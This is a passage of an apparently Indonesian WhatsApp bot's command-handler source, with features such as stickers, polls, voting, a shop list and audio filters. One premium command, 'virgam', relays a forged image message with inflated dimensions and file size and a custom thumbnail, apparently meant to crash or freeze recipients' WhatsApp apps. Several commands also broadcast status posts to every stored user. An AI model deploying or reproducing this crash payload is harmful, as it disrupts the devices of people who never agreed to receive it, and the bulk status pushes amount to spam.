teks += `✏️𝗡𝗮𝗺𝗮 𝗚𝗿𝘂𝗽 : ${metadata.subject}\n👨‍⚖️𝗢𝘄𝗻𝗲𝗿 : ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n📍𝗜𝗗 : ${metadata.id}\n📆𝗗𝗶 𝗕𝘂𝗮𝘁 : ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n👥𝗔𝗻𝗴𝗴𝗼𝘁𝗮 : ${metadata.participants.length}\n\n────────────────────────\n\n`
}
hinata.sendTextWithMentions(m.chat, teks, m)
}break
//=================================================//
case 'remini': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!quoted) return reply(`Dimana gambarnya?`)
if (!/image/.test(mime)) return reply(`Kirim / Balas Foto Dengan Caption ${prefix + command}`)
const { remini } = require('./HinataBase/lib/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance")
hinata.sendMessage(m.chat, { image: proses, caption: mess.success}, { quoted: m})
}break
//=================================================//
case 'sc': case 'info': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
hinatamsg(`${scmenu(prefix)}`)
}break
//=================================================//
case 'virgam': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
	"imageMessage": {
	"url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m232/up-oil-image-b78d6ac8-7f22-41e9-982b-671521789ec1?ccb=9-4&oh=01_AdTbHXT85p8gfE104asrKWx3rZGkWuILwvlP4fehYEHLiw&oe=64E6E572&mms3=true",
	"mimetype": "image/jpeg",	
	"fileSha256": "TwxGIa1qFIDW39pvaGPl99aFqWf9xrJFMcDT16vT7U4=",
	"fileLength": "9565843",
	"height": 39993,
	"width": 1080,
	"mediaKey": "nnJ5XWdm409Z5qVLxUJUuVRUAUuNF44Gx5bsiCkrFEY=",
	"fileEncSha256": "OTCC5XCCa8rZMTD/ou8Q86dB3Vglqpx5bN0M8hCksCw=",
	"directPath": "/o1/v/t62.7118-24/f1/m232/up-oil-image-b78d6ac8-7f22-41e9-982b-671521789ec1?ccb=9-4&oh=01_AdTbHXT85p8gfE104asrKWx3rZGkWuILwvlP4fehYEHLiw&oe=64E6E572",
	"mediaKeyTimestamp": "1690265380",
	"jpegThumbnail": virgam,
	"scansSidecar": "/ZCEGb8p+SVtjE0eAKtM9SZyjz9cm9Utxmy/Zuvb8BbbG1V76XsTFA==",
	"scanLengths": [
687102,
6152788,
1292833,
1433120
	],
	"midQualityFileSha256": "R1EivePk56jyqH4iEQOfNOrKCiEfQCO9JYqtCwAdX4o="
}

}), { userJid: from, quoted:m})
hinata.relayMessage(from, document.message, { messageId: document.key.id })
await sleep(2000)
}break
//=================================================
case 'buatsw': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
let men = [];
for (let x of pengguna) {
men.push(x)
const result = [ x ]
if (!m.quoted && !text) return reply('📝Fitur ini di gunakan untuk membuat story whatsapp pada bot\n\n📌Contoh :\nBalas pada pesan text yang ingin di jadikan story whatsapp')
if (m.quoted && m.quoted.mtype === 'conversation' && !text) _m = hinata.sendMessage('status@broadcast', {
text: m.quoted.text,
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: result
});
if (!m.quoted && text) _m = hinata.sendMessage('status@broadcast', {
text,
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: result
});
}
reply(`*Berhasil mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
}break
//=================================================
case 'buatswimage': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!quoted) return reply(`Balas image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Balas image dengan caption *${prefix + command}*`)
const media = await hinata.downloadAndSaveMediaMessage(quoted)
hinata.sendMessage('status@broadcast', { image: { url: media }}, {statusJidList: pengguna})
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
}break
//=================================================
case 'buatswvideo': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!quoted) return reply(`Balas video Dengan Caption ${prefix + command}`)
if (!/video/.test(mime)) return reply(`Balas video dengan caption *${prefix + command}*`)
const media = await hinata.downloadAndSaveMediaMessage(quoted)
hinata.sendMessage('status@broadcast', { video: { url: media }}, {statusJidList: pengguna})
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
}break
//=================================================
case 'swin': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!text) return reply(`masukin text nya`)
hinata.sendMessage('status@broadcast', {
text: `${text}`
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: pengguna
});
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
}break
//=================================================
case 'vnsw': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!text) return m.reply(`masukin text nya yang ada di database listvn`)
var huy = fs.readFileSync(`./HinataBase/database/Audio/${text}.mp3`)
hinata.sendMessage('status@broadcast', {audio: huy, mimetype: 'audio/mp4', ptt:true},{
backgroundColor: '#FF000000',
statusJidList: pengguna
});
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
}break
//=================================================
case 'inisw': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!text) return reply(`masukin text nya yang ada di database listvn`)
var buu = fs.readFileSync(`./HinataBase/database/Audio/${text}.mp3`)
hinata.sendMessage('status@broadcast', {audio: buu, mimetype:'audio/mp4', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: `https://wa.me/${global.ownernumber}`,
title: `${global.botname}`,
sourceUrl: `https://wa.me/${global.ownernumber}`,
thumbnail: thumb}}},{
backgroundColor: '#FF000000',
statusJidList: pengguna
});
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
}break
//=================================================
case 'buatswptv': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!m.quoted) return reply(`Balas Video Dengan Caption ${prefix + command}`)
var ppt = m.quoted
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({
	"ptvMessage": ppt
}), { userJid: from, quoted:m})
hinata.relayMessage('status@broadcast', ptv.message, {
statusJidList: pengguna
})
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
}break
//=================================================
case 'toptv': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!m.quoted) return reply(`Balas Video Dengan Caption ${prefix + command}`)
if (/video/.test(mime)) {
var ppt = m.quoted
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({
	"ptvMessage": ppt
}), { userJid: from, quoted:m})
hinata.relayMessage(from, ptv.message, { messageId: ptv.key.id })
}
}break
//=================================================
case 'buatsws': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!quoted) return reply(`Balas Sticker Dengan Caption ${prefix + command}`)
if (!/webp/.test(mime)) return reply(`Balas sticker dengan caption *${prefix + command}*`)
const media = await hinata.downloadAndSaveMediaMessage(quoted)
hinata.sendMessage('status@broadcast', { sticker: { url: media }}, {statusJidList: pengguna})
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
}break
//=================================================
case 'qc': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!q) return reply(`📌Contoh: ${prefix + command} pink hallo\n\n꒰ 🖌️ 𝗟𝗶𝘀𝘁 𝗪𝗮𝗿𝗻𝗮 ꒱ ೄྀ࿐ ˊˎ-\n━━━━━━⊱⋆⊰━━━━━━\npink\nbiru\nmerah\nhijau\nkuning\nungu\nbirutua\nbirumuda\nabu\norange\nhitam\nputih\nteal\nmerahmuda\ncokelat\nsalmon\nmagenta\ntan\nwheat\ndeeppink\napi\nbirulangit\njingga\nbirulangitcerah\nhotpink\nbirumudalangit\nhijaulaut\nmerahtua\noranyemerah\ncyan\nungutua\nhijaulumut\nhijaugelap\nbirulaut\noranyetua\nungukehitaman\nfuchsia\nmagentagelap\nabu-abutua\npeachpuff\nhijautua\nmerahgelap\ngoldenrod\nabu-abutua\nungugelap\nemas\nperak`)
if (text.length > 100) return reply(`🚩 Max 100 character.`)
let [color, ...message] = text.split(' ');
message = message.join(' ');
let backgroundColor;
switch(color) {
case 'pink':
backgroundColor = '#f68ac9';
break;
case 'biru':
backgroundColor = '#6cace4';
break;
case 'merah':
backgroundColor = '#f44336';
break;
case 'hijau':
backgroundColor = '#4caf50';
break;
case 'kuning':
backgroundColor = '#ffeb3b';
break;
case 'ungu':
backgroundColor = '#9c27b0';
break;
case 'birutua':
backgroundColor = '#0d47a1';
break;
case 'birumuda':
backgroundColor = '#03a9f4'; 
break;
case 'abu':
backgroundColor = '#9e9e9e';
break;
case 'orange':
backgroundColor = '#ff9800';
break;
case 'hitam':
backgroundColor = '#000000';
break;
case 'putih':
backgroundColor = '#ffffff';
break;
case 'teal':
backgroundColor = '#008080';
break;
case 'merahmuda':
backgroundColor = '#FFC0CB';
break;
case 'cokelat':
backgroundColor = '#A52A2A';
case 'salmon':
backgroundColor = '#FFA07A'; 
break; 
case 'magenta':
backgroundColor = '#FF00FF'; 
break; 
case 'tan':
backgroundColor = '#D2B48C'; 
break;
case 'wheat':
backgroundColor = '#F5DEB3'; 
break;
case 'deeppink':
backgroundColor = '#FF1493'; 
break; 
case 'api':
backgroundColor = '#B22222';
break;
case 'birulangit':
backgroundColor = '#00BFFF';
break; 
case 'jingga':
backgroundColor = '#FF7F50';
break;
case 'birulangitcerah':
backgroundColor = '#1E90FF'; 
break; 
case 'hotpink':
backgroundColor = '#FF69B4'; 
break; 
case 'birumudalangit':
backgroundColor = '#87CEEB'; 
break; 
case 'hijaulaut':
backgroundColor = '#20B2AA'; 
break; 
case 'merahtua':
backgroundColor = '#8B0000'; 
break; 
case 'oranyemerah':
backgroundColor = '#FF4500'; 
break; 
case 'cyan':
backgroundColor = '#48D1CC'; 
break; 
case 'ungutua':
backgroundColor = '#BA55D3'; 
break; 
case 'hijaulumut':
backgroundColor = '#00FF7F'; 
break; 
case 'hijaugelap':
backgroundColor = '#008000'; 
break; 
case 'birulaut':
backgroundColor = '#191970'; 
break; 
case 'oranyetua':
backgroundColor = '#FF8C00'; 
break; 
case 'ungukehitaman':
backgroundColor = '#9400D3'; 
break; 
case 'fuchsia':
backgroundColor = '#FF00FF'; 
break; 
case 'magentagelap':
backgroundColor = '#8B008B'; 
break;
case 'abu-abutua':
backgroundColor = '#2F4F4F'; 
break;
case 'peachpuff':
backgroundColor = '#FFDAB9'; 
break;
case 'hijautua':
backgroundColor = '#BDB76B'; 
break;
case 'merahgelap':
backgroundColor = '#DC143C'; 
break;
case 'goldenrod':
backgroundColor = '#DAA520'; 
break;
case 'abu-abutua':
backgroundColor = '#696969'; 
break;
case 'ungugelap':
backgroundColor = '#483D8B'; 
break;
case 'emas':
backgroundColor = '#FFD700'; 
break;
case 'perak':
backgroundColor = '#C0C0C0'; 
break;
default:
return reply('Warna yang dipilih tidak tersedia.')
}
let obj = {
type: 'quote',
format: 'png',
backgroundColor,
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: await hinata.profilePictureUrl(m.sender, "image").catch(() => 'https://telegra.ph/file/999b290ecb3e50107a9da.jpg'),
}
},
text: message,
replyMessage: {},
},
],
};
let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
headers: {
'Content-Type': 'application/json',
},
});
let buffer = Buffer.from(response.data.result.image, 'base64');
hinata.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break
//=================================================
case 'reportbug': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`◈ ━━━━━ ᴄᴏɴᴛᴏʜ ━━━━━ ◈\n\n.reportbug Halo Dev perintah play tidak berfungsi`)
textt = `◈ ━━━━━ ʟᴀᴘᴏʀᴀɴ ━━━━━ ◈`
teks1 = `\n\nɴᴀᴍᴀ : @${m.sender.split("@")[0]}\nᴘᴇsᴀɴ : ${text}`
teks2 = `\n\n*Halo ${pushname}, ${hinataytimewisher}*\n*ᴘᴇsᴀɴ ᴀɴᴅᴀ ᴛᴇʟᴀʜ ᴅɪ ᴋɪʀɪᴍ ᴋᴇ ᴘᴇɴɢᴇᴍʙᴀɴɢ*.\n*ᴛᴇʀɪᴍᴀᴋᴀsɪʜ...*`
for (let i of owner) {
hinata.sendMessage(i + "@s.whatsapp.net", { text: textt + teks1, mentions: [m.sender], }, { quoted: m, })
}
hinata.sendMessage(m.chat, { text: textt + teks2 + teks1, mentions: [m.sender], contextInfo:{ mentionedJid:[sender], "externalAdReply": { "showAdAttribution": true, "renderLargerThumbnail": true, "title": botname, "containsAutoReply": true, "mediaType": 1, "thumbnail": banerimage, "mediaUrl": `${gr}`, "sourceUrl": `${gr}` }}}, { quoted: m, })
}break
//=================================================
case 'obfuscate':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!q) return reply(`*Contoh* ${prefix+command} const Hinatabot = require('baileys')`)
let meg = await obfus(q)
reply(`Berhasil
${meg.result}`)
}break
//=================================================
case 'gayatext': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
let { styletext } = require('./HinataBase/lib/styletext')
if (!text) return reply('Masukkan teks Kueri!')
let anu = await styletext(text)
let teks = `Gaya Teks Dari ${text}\n\n`
for (let i of anu) {
teks += `*${i.name}* : ${i.result}\n\n`
}
reply(teks)
}break
//=================================================
case 'fliptext': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (args.length < 1) return reply(`Contoh : ${prefix+command} ${ownername}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
reply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}break
//=================================================
case 'tts': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply('masukan text?')
let texttts = text
const hinatarl = googleTTS.getAudioUrl(texttts, {
lang: "id",
slow: false,
host: "https://translate.google.com",
})
return hinata.sendMessage(m.chat, { audio: { url: hinatarl, }, mimetype: 'audio/mp4', ptt: true, fileName: `${text}.mp3`, }, { quoted: m, })
}break
//=================================================
case 'toqr':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!q) return reply('Harap sertakan tautan atau teks! yang ingi di jadikan barcode')
const QrCode = require('qrcode-reader')
const qrcode = require('qrcode')
let qyuer = await qrcode.toDataURL(q, { scale: 35 })
let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
let buff = getRandom('.jpg')
await fs.writeFileSync('./'+buff, data)
let medi = fs.readFileSync('./' + buff)
await hinata.sendMessage(from, { image: medi, caption: mess.success }, { quoted: m })
setTimeout(() => { fs.unlinkSync(buff) }, 10000)
}break
//=================================================
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
let media = await hinata.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
hinata.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`Balas ke audio yang ingin Anda ubah dengan teks *${prefix + command}*`)
} catch (e) {
reply(e)
}
}break
//=================================================//
case 'ebinary': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!q) return reply(`${prefix + command} ${global.botname}`)
let { eBinary } = require('./HinataBase/scrape/binary')
let eb = await eBinary(`${q}`)
reply(eb)
}break
//=================================================//
case 'dbinary': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!q) return reply(`${prefix + command} ${global.botname}`)
let { dBinary } = require('./HinataBase/scrape/binary')
let db = await dBinary(`${q}`)
reply(db)
}
break
//=================================================//
case 'tinyurl': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if(!q) return reply('📝Berikan tautan yang ingin di perpendek\n\n📌 *Contoh* : https://www.google.com')
const request = require('request')
request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
try {
reply(body)
} catch (e) {
reply(e)
}
})
}break
//=================================================//
case 'ssweb': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!q) return reply(`📌 *Contoh* : ${prefix+command} link`)
const scp1 = require('./HinataBase/lib/scraper')
let krt = await scp1.ssweb(q)
hinata.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:m})
}break
//=================================================//
case 'vote': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
if (m.chat in vote) return reply(`_Masih ada suara di obrolan ini!_\n\n*${prefix}deletevote* - untuk menghapus suara`)
if (!q) return reply(`Masukkan Alasan Memilih, Contoh: *${prefix + command} Pemilik Tampan*`)
reply(`Pemungutan suara dimulai!\n\n*${prefix}upvote* - untuk upvote\n*${prefix}downvote* - untuk downvote\n*${prefix}checkvote* - untuk memeriksa vote\n*${prefix}deletevote* - untuk hapus vote`)
vote[m.chat] = [q, [], []]
await sleep(1000)
upvote = vote[m.chat][1]
devote = vote[m.chat][2]
teks_vote = `* VOTE *

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Silakan Ketik Di Bawah Ini
*${prefix}upvote* - untuk menaikan vote
*${prefix}downvote* -untuk menurunkan vote
*${prefix}deletevote* - untuk hapus vote`
hinata.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
}break
//=================================================//
case 'upvote': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!(m.chat in vote)) return reply(`_*tidak ada voting di grup ini!*_\n\n*${prefix}vote* - untuk memulai voting`)
isVote = vote[m.chat][1].concat(vote[m.chat][2])
wasVote = isVote.includes(m.sender)
if (wasVote) return reply('Anda telah Memilih')
vote[m.chat][1].push(m.sender)
menvote = vote[m.chat][1].concat(vote[m.chat][2])
teks_vote = `* VOTE *

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -to downvote
*${prefix}deletevote* - to delete vote`
hinata.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
}break
//=================================================//
case 'downvote': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!(m.chat in vote)) return reply(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
isVote = vote[m.chat][1].concat(vote[m.chat][2])
wasVote = isVote.includes(m.sender)
if (wasVote) return reply('You have Voted')
vote[m.chat][2].push(m.sender)
menvote = vote[m.chat][1].concat(vote[m.chat][2])
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -to downvote
*${prefix}deletevote* - to delete vote`
hinata.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
}break
//=================================================//
case 'checkvote': case 'cekvote': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
if (!(m.chat in vote)) return reply(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${hinata.user.id}
`
hinata.sendTextWithMentions(m.chat, teks_vote, m)
}break
//=================================================//
case 'deletevote': case 'delvote': case 'hapusvote': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplyadmin()
if (!isBotAdmins) return hinatareplybotadmin()
if (!(m.chat in vote)) return reply(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
delete vote[m.chat]
reply('Sesi Vote Berhasil Dihapus Di Grup Ini')
}break
//=================================================//
case 'poll': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
let [poll, opt] = text.split("|")
if (text.split("|") < 2)
return await reply(
`Sebutkan pertanyaan dan minimal 2 opsi\n*Contoh :* ${prefix}poll Apa aku ganteng?|Ya,Tidak,Sangat Jelek...`
)
let options = []
for (let i of opt.split(',')) {
options.push(i)
}
await hinata.sendMessage(m.chat, {
poll: {
name: poll,
values: options
}
})
}break
//=================================================//
case 'listcmd': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
let teks = `
*List Cmd Sticker*
${Object.entries(global.db.data.sticker).map(([key, value], index) => `True : ${value.text}`).join('\n')}
`.trim()
hinata.sendText(from, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}break
//=================================================
case 'produk':
case 'shop': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
let teks = '┌──⭓「 *LIST STORE* 」\n│\n'
for (let x of db_respon_list) {
teks += `│🛍️ ${x.key}\n`
}
teks += `│\n└────────────⭓\n\n`
reply(teks)
}break
//=================================================
case 'addproduk': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isSeller) return hinatareplyseller()
if (!m.isGroup) return hinatareplygrouponly()
var args1 = text.split("@")[0]
var args2 = text.split("@")[1]    
if (!q.includes("@")) return reply(`Gunakan dengan cara ${prefix+command.slice(0)} *Nama Item@Item*\n\n_Contoh_\n\n${prefix+command.slice(0)} namalist@List`)
if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (/image/.test(mime)) {
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./HinataBase/lib/uploader')
let media = await hinata.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
addResponList(from, args1, args2, true, `${mem}`, db_respon_list)
reply(`Sukses set list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Sukses Add List Dengan Kunci : *${args1}*`)
}
}break
//=================================================
case 'delproduk': case 'hapusproduk': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isSeller) return hinatareplyseller()
if (!m.isGroup) return hinatareplygrouponly()
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!q) return reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item*\n\n_Contoh_\n\n${command.slice(1)} namalist`)
if (!isAlreadyResponList(from, q, db_respon_list)) return reply(`List Item dengan Nama *${q}* tidak ada di database!`)
delResponList(from, q, db_respon_list)
reply(`Produk *${q}* berhasil di hapus`)
}break
//=================================================
case 'updateproduk': case 'updatproduk': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isSeller) return hinatareplyseller()
if (!m.isGroup) return hinatareplygrouponly()
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item@Item*\n\n_Contoh_\n\n${command.slice(1)} namalist@List`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
if (/image/.test(mime)) {
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./HinataBase/lib/uploader')
let media = await hinata.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
updateResponList(from, args1, args2, true, `${mem}`, db_respon_list)
reply(`Sukses update list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
updateResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Sukses update respon list dengan key *${args1}*`)
}
}break
//=================================================
case 'proses': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isSeller) return hinatareplyseller()
if (!m.isGroup) return hinatareplygrouponly()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
let pemesan = text.split("|")[0]
let pesan = text.split("|")[1]
if (!pemesan && !pesan) return reply(`📝 Fitur ini di gunakan untuk memosting pesanan yang sedang di proses\n\n📌Contoh: ${prefix + command} ${global.ownernumber}|Deskripsi pesanan`)
let pro = `🛍️「 *PESANAN DI PROSES* 」🛍️


\`\`\`📆 ${xhari}, ${xdate} ${xbulan} ${xtahun}\`\`\`
\`\`\`🕔 JAM     : ${time}\`\`\`
\`\`\`✨ STATUS  : Pending\`\`\`

Pesanan dengan nomor ponsel ${pemesan} sedang di proses!

≡ *DESKRIPSI PESANAN*
━━━━━━⊱⋆⊰━━━━━━
${pesan}`
hinata.sendMessage(m.chat, { text: pro, mentions: [users] }, { quoted: hinata.chat })
}break
//=================================================
case 'done': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isSeller) return hinatareplyseller()
if (!m.isGroup) return hinatareplygrouponly()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
let don = `🎉「 *TRANSAKSI BERHASIL* 」🎉\n\n\n\`\`\`📅 HARI    : ${xhari}\n📆 TANGGAL : ${xdate} ${xbulan} ${xtahun}\n⌚ JAM     : ${time}\n✨ STATUS  : Berhasil\`\`\`\n\n\nTerimakasih @${users.split("@")[0]} Next Order ya🙏`
hinata.sendMessage(m.chat, { text: don, mentions: [users] }, { quoted: hinata.chat })
}break
//=================================================
case 'family100': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
 if ('family100'+from in _family100) {
 m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
 throw false
 }
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
 let random = anu[Math.floor(Math.random() * anu.length)]
 let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
 _family100['family100'+from] = {
 id: 'family100'+from,
 pesan: await hinata.sendText(from, hasil, m),
 ...random,
 terjawab: Array.from(random.jawaban, () => false),
